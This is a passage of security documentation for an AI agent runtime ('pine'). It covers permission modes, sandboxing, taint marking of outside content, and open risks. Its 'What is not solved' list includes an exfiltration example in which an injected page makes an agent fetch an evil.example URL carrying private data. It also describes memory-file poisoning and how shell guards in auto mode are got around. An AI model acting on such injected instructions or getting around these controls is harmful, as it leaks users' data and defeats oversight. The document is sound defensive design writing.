- For one conversation, as a decision made with the facts in front of you: choose bypass in a
  conversation that is already tainted and the UI asks whether you want a clean conversation
  (recommended) or bypass in this one anyway. "Anyway" holds for that conversation until it is
  reset or the mode changes.
- Always: `"security": { "bypassWhenTainted": true }`. `pine check` says what that means for
  each agent whose configured mode is `bypass`.

With either, the guards on instruction files and git settings (layer 4) no longer hold for
shell commands in that conversation: bypass has no sandbox and asks nothing. The file tools
still refuse them.

**Plan mode** is a fifth mode, for a different question: not how much the agent may do, but
whether it does anything yet. In `plan` the gate lets through what only looks and refuses
everything else with a fixed sentence, without asking you:

| In plan mode | Examples |
|---|---|
| Runs | `read`, `grep`, `find`, `ls`; shell commands that only read (`ls`, `cat`, `git status`, `git diff`); web search and page reading; MCP tools their server declares read-only; `manual`, `state_get`, `sources`, `schedules`, `mcp_servers`, `skills`; `question` and `todo`; `stop_program`; looking at an app (after your yes for that app) |
| Refused | `write`, `edit`, every other shell command (a redirect such as `> file` included, and every command in the background), `download`, `send`, `publish_event`, `state_set`, `delegate`, `subagent`, `request_access`, every tool that changes the setup (`add_...`, `remove_...`, `subscribe`), MCP tools that are not declared read-only (opening a page in the browser, the tools of a `commands` server), acting in an app |

The agent is told so in the note in front of your message, answers with a plan, and is told
when you switch the mode off. A run started from outside is held to it too. What is on your
`approve` list still asks. Plan mode is a way of working, not a wall: which shell command only
looks is decided by its name, an MCP tool by its server's own word, and the sandbox is that
of the mode the agent had when planning was switched on (none after `auto`, the sandbox
after `safe`). A command that only reads can read whatever that mode lets it read. What holds
an agent that is not to be trusted is the sandbox of `safe` mode, not planning.

Set the mode where it should last, or switch it while running:

```json
{ "mode": "manual" }
```

in `agent.json` (or `defaults.mode` in `pine.json` for all agents); `/mode` or `shift+tab` in the
terminal UI; `pine mode <agent> <mode>` from a shell. A switch to `auto`, `safe` or `manual` is saved
in the agent's `agent.json` and holds after a restart. A switch to `bypass` or `plan` lasts until
the daemon restarts.

### 5. Sources that go and look

- **A web address (`http`)** is fetched by pine itself, so the address is yours to confirm: the
  dialog names it and says when it is on your own network, a redirect is followed only on the
  same host, and a token is sent nowhere else. An address that was confirmed as a public one is
  not followed into your network if its name later leads there. What the address answers is
  outside content like any page an agent reads.
- **A command (`command`)** runs in a sandbox, whatever the mode of the agent the source
  belongs to (the main agent, for a source of all agents): that agent's own folders, no
  network, not your environment, and instruction files read-only. It cannot read
  pine's secrets or write its configuration. You see the command line before it is set up, in
  every mode. What it prints is outside content unless you say the source is yours. On a
  machine without a working sandbox it is not run at all.
- **Status lines** (when a source last looked, what it found) are read by agents without the
  mark that outside content gets. A source therefore repeats a found value there only when it
  is a number or a single word.

### 6. A new kind of source is a program

A source type runs inside pine with pine's rights; no sandbox applies to it. It gets in by your
hand (`sourceTypes` in `pine.json`, or `"use"` on a single source's entry) or through the main
agent's `add_source_type`, and then only

- from the main agent, in a conversation with you,
- never from a conversation that has read outside content: there the tool refuses without
  asking you,
- with your yes in a dialog that says it is a program, how long it is, what it imports and
  where the file is, in every mode and every time,
- as a copy pine takes at that moment into its own home, which agents cannot write. What you
  confirmed is what runs.

Read the file before you confirm. Nothing else stands between that module and your account.
`pine check` lists every registered source type, and every source that names a module with
`"use"`, with the file it runs.

### 7. Schedules act in your name

What a schedule starts counts as your wish: the agent is woken with its usual tools, and
nothing is marked as outside content. So a schedule must really be your wish:

- An agent schedules for the conversation it is in, or for itself from its main conversation,
  without a question (except in manual mode). For itself from a side conversation, or for all
  agents (the main agent only), you are asked.
- In a conversation that has read outside content you are asked in every case, in every mode,
  and you see the task: a sentence on a web page must not turn into something done every hour.
- An interval an agent sets is at least a minute.
- A schedule is an entry in pine's configuration, which agents cannot write. `pine schedules`
  shows all of them with their tasks; an agent's `schedules` tool shows its own and those for
  all agents.

### A goal goes on in your name

With `/goal` an agent is called again and again until an objective is met ("Goal mode" in
[agents.md](agents.md)). Each of those calls counts as your wish, like a schedule. So what may
start one is narrow:

- Only you set a goal, pause it, resume it or clear it, through the terminal UI or the control
  API. No tool reaches it: an agent cannot give itself a goal, more rounds or another objective.
- What calls the agent again is your objective, word for word, inside fixed text of pine's.
  Nothing the agent wrote and nothing the judge said is in it. The agent's answer may repeat
  what a web page told it; put into the next round's message, that text would speak with your
  voice. The judge's reason is shown to you instead.
- The judge reads the agent's answer, so text from outside can reach it. All it can do with
  that is say one of three words. A wrong "met" or "blocked" stops the work; a wrong "continue"
  costs rounds, of which there are at most `limits.goalRounds` before you are needed again.
  No verdict at all pauses the goal.
- A run started from outside has no goal: it works in the `~u` twin of a conversation, where
  none can be set, and its end is never judged or continued.
- A goal changes nothing about what an agent may do. In every round its mode and your
  approvals apply as in any other task; a conversation that has read outside content
  stays marked through all rounds.
- Nothing goes on unseen: your own message, `esc`, a failed round and a restart of pine each
  pause the goal until you say `/goal resume`.

### Commands in the background

An agent can start a shell command that goes on after its turn (`background: true` on the
shell tool; [coding.md](coding.md), "Commands in the background"). What keeps that inside the
same limits:

- Only your own conversations can. A run started from outside is refused, and so is a single
  run that has no conversation to report to (a task another agent handed over, its
  sub-agents).
- pine starts the command, inside the sandbox the conversation's other commands run in at
  that moment: the same files, the same network, the same environment. Running on gives it
  nothing more. A conversation has at most eight at a time.
- It is not held to the shell's time limit (`bashTimeoutSec`). It ends by itself, when the
  agent (`stop_program`) or you (the code pane) stop it, or when its conversation is reset or
  removed. Quitting pine does not end it.
- When it has ended, pine tells the conversation in a message of its own. The last lines the
  command printed stand in it as quoted output, each line marked, read through the agent's
  sandbox. They are information: the message is not yours.
- What is still running is found by pine itself, not reported by the agent, and only what the
  conversation's own commands started can be stopped: never a process somebody names by its
  number.
- On Linux a conversation that has read outside content cannot start one at all ("On Linux"
  under layer 3).

### Undo is yours

`/undo` takes back your last message with the files it changed in the conversation's folder
([coding.md](coding.md), "Taking a message back"). It is the one place where pine's own side
writes into a folder, so it is narrow:

- Only you undo and redo, in the terminal UI or through the control API. No agent has a tool
  for it, and only a message you typed is taken back, never a run that outside content
  started.
- The states of the folder are kept in pine's data folder (`data/snapshots`), which no agent
  can write. An agent cannot change what an undo restores.
- The files are put back by git inside a sandbox that can write that folder and pine's own
  store of states, and nothing else. It reads neither the folder's git settings nor yours,
  runs no hook and no filter, and does not write through a link.
- Taking a message back puts the conversation's outside-content mark, and what you allowed
  the conversation, back to what they were before that message. Never to more.
- An undo restores files. What left the machine (a message sent, a push, a request to a
  server) and what a command did outside the folder is not taken back.

### 8. Skills are instructions

A skill is read into an agent's prompt (its name and description) and followed when a task
calls for it, so it is guarded like the instruction files:

- Skills lie in pine's home, where an agent can read its own and write none. `add_skill`
  writes them; an agent's shell and file tools cannot.
- In a conversation that has read outside content `add_skill` is not written unseen: text
  from a web page must not become a standing instruction. It is shown to you first, with its
  instructions, for every scope.
- A skill for all agents is the main agent's to add, and you see its description and
  instructions before it exists. So does one an agent adds for itself from a side conversation.
  In manual mode you see every skill before it exists.
- Scripts that go along with a skill run like anything else the agent runs: in its sandbox, or without one in `auto` and `bypass` mode.
- Files are copied as files. A link in the folder that is to go along is refused, so a skill
  cannot be made to carry a file from outside the workspace.

### 9. Outputs check for themselves

Whatever asks, the Telegram source sends only to your own chat, and the MQTT source publishes
only to topics on its `publish` list. In a conversation that has read outside content, the
`send` tool asks you first. An agent's `publish` list names the topics it
may use at all. Agents cannot publish on pine's own topics (`agent/`, `approval/`, `pine/`,
`state/`, `timer/`).

### 10. Secrets

- Secrets live in `.env`. pine fills them into the configuration and does not put them into
  its environment, so child processes do not inherit them.
- Known secret values (every value in `.env` of eight characters or more, bot tokens, the control token) are replaced with
  `[redacted]` in events, outgoing messages and log lines.
- A secret does not have to pass through a model to be set up. Agents are told never to ask for
  one; a tool that needs one leaves it out, and you type it into pine's own dialog, from where
  it goes to the daemon and into `.env`. One that is in `.env` already is used by its name. A
  model that runs somewhere else never receives it either way.
- If you write a secret into a conversation anyway and an agent stores it, it is redacted from
  then on and removed from the stored events and tasks. That conversation's history and the
  model have still seen it: change such a secret if the model is not yours.
- `pine check` reports configuration files, and a home folder, that other users can read.

### 11. Limits against runaway behaviour

Delegation depth and loops, event hops, queue length per agent, task and shell time limits,
prompt size for untrusted events, the rounds of a goal: all in [configuration.md](configuration.md). The webhook
rate is fixed at 120 requests a minute per hook, and a conversation has at most eight commands
in the background at a time. A command in the background is not held to the shell's time
limit.

## A layout that keeps the pieces apart

The example home starts with one agent, `main`, that has web search and the browser, and your
account in your own conversations. What stands between the two is small: once a
conversation has read the web, you are asked before it sends something out, and before a
critical action as always ("What asks you"). Its shell is not looked at. That is the
convenient setup, not the careful one; the table below is the careful one.

The dangerous combination is one agent that has private data, reads outside content and can
send things out. Once you have agents with private data, split those:

| Agent | Has | Does not have |
|---|---|---|
| `main` | Your conversation, your account, delegation to everyone | Web tools |
| `scout` | Web search and page reading | Anything private: an empty workspace, no delegation, no state |
| Specialists (`gonzo`, `house`) | Their repository, their own MCP servers | Web tools, network |
| `house` | Events from cameras and sensors (untrusted profile), writes `house/` state | A shell, the network |

`main` asks `scout` to research. What comes back is text, and it taints `main`'s session: from
then on `main` needs your approval to publish events or to hand `scout` another task. Scout
itself can be fooled by a page, but it has nothing to give away and cannot act.

## What is not solved

- **Leaks through an approved or unguarded channel.** If you give one agent both private files
  and web access, a page can ask it to fetch `https://evil.example/?q=<your data>`, and that
  fetch is the tool working as intended. The layout above avoids it; the URL length limit only
  makes it slower.
- **An agent in `auto` or `bypass` mode.** It works with your own rights and without a
  sandbox. pine's home and program are kept from it by reading its commands, which a script,
  a variable or a program it starts gets past ("pine's own files without a sandbox"). After
  outside content its shell can also write what is read as instructions or what makes git
  run programs (a `CLAUDE.md` in a repository, a hook): the file tools refuse that, and
  nothing looks at a shell command that does it, unless it names a hook or a repository's
  configuration, which asks you. For an agent that reads the web, `safe` mode is the wall.
- **Memory after outside content.** An agent writes its own `MEMORY.md`, `AGENTS.md` and
  `SOUL.md` also in a conversation that has read outside content, unchecked. What a page
  talks it into writing there is read in every later conversation. Look into those files
  now and then; rules it must never change go into `agents/<id>/AGENTS.md`, which it cannot
  write.
- **A model server reads what it is sent.** Whoever runs a server you add (`pine model add`,
  `add_model_server`) sees every conversation of the agents that use its models: your messages,
  the files they read, the results of their tools. Over plain `http` so does anyone on the
  network path; use it on this machine, on your own network or through a VPN, and `https`
  elsewhere. pine asks you before it adds one and never sends a key anywhere but to the address
  you confirmed.
- **Bad answers.** An injected page can still make an agent tell you something false. Approval
  prompts show you the action, not whether the reasoning behind it was honest.
- **Approval fatigue.** If you approve without reading, layer 4 is worth nothing. Requests show
  the full arguments for that reason.
- **Bypass mode.** It is what it says: an agent in bypass acts with your rights, on your files,
  with the network, unasked. Use it for a task you are watching, on an agent that is not reading
  the web, and switch back.
- **Your own MCP servers, extensions and source types.** They run unsandboxed (a local MCP
  server only when you added it yourself and did not mark it `"sandboxed"`), also a source
  type the main agent wrote and you confirmed: the dialog shows what it is, not what it does. A server that can delete mail can
  delete mail when an agent asks; mark such servers `"approve": "tainted"` or `"always"`.
- **Shell with network.** `sandbox.network: true` lets commands reach the internet and your
  local network, including an unauthenticated model server and anything else that listens on
  a port of this machine. On Linux also programs that listen on a socket file in the temp
  folders (a tmux server, an editor's helper, an ssh agent): some of those run commands for
  whoever connects. macOS keeps socket files closed ("On Linux" under layer 3). Prefer the `web` server or a
  `commands` tool for the one thing that needs the network.
- **App control is outside the sandbox.** An agent that operates your apps (the bundled
  `computer` server) acts through them, not through its shell: what an app can open, it can
  open. A terminal app or the Finder reaches pine's home; a mail app sends as you. What stands
  in between is your yes for each app in a conversation, and that pine does not act in the app
  it runs in itself, where its questions are answered. Say yes to an app that can run commands
  or send messages only for a task you watch.
- **A signed-in browser.** With a persistent `profile`, the bundled browser acts as you on every
  site you signed in to. A hostile page can ask the agent to click things there. Keep signed-in
  profiles for tasks you start and watch yourself. The same goes, without a `profile`, for
  what you log in to in a window the agent opened for you (`browser_show`): the agent is
  logged in there too, for as long as that conversation's browser runs ([mcp.md](mcp.md)).
- **The sandbox is the operating system's.** On macOS, `sandbox-exec` is deprecated but is
  what Apple's own tools and other agent runtimes use. On Linux, bubblewrap is what Flatpak
  uses; pine adds one narrow system call filter to it (no sockets to other programs while a
  command has no network) and no general one. On both, a kernel or sandbox bug would be a
  way out. For stronger isolation run the daemon under a separate user with no access to your
  files.
- **Linux: new instruction files exist until the command ends**, and are looked for six
  folders deep. See "On Linux" under layer 3.
- **Local users.** Another account on the machine that can read pine's home has everything.
  Keep the home at mode 700.
- **Model quality.** A small quantised model follows hostile text more readily than a large one.
  The layers above are built for that, but a weaker model will trip the approval prompts more
  often.

## Checklist

1. `pine check` shows "No security notes", or you know why each note is there.
2. Every webhook has a secret (`pine check` names hooks and `webhook` sources that have none), and `pine check` names no source whose reports count as yours unless it should (a paired Telegram account is not listed).
3. `.env`, `pine.json`, `models.json` and `auth.json` are mode 600; the home is 700. `pine check` reports all of these.
4. No agent has `"trustWorkspace": true` or `"mode": "bypass"` in its configuration, and every agent in `auto` mode is one you want to work with your whole account.
5. Web and browser tools are on an agent whose workspace holds nothing private and whose mode
   is `safe`; or you accept, for an agent in `auto` mode, that nothing looks at its shell
   after it has read the web.
6. MCP servers that return other people's text have `"taints": true`; those that change things
   have `"approve": "tainted"`.
7. No route sets `"trust": "owner"` for a source others can write to.
8. `http.host` is `127.0.0.1`. Remote access goes through SSH or a tunnel.
9. You receive approval requests (send yourself one: give an agent `"approve": ["bash:*"]` once
   and ask it to run `ls`; not while the agent is in bypass, where nothing asks).
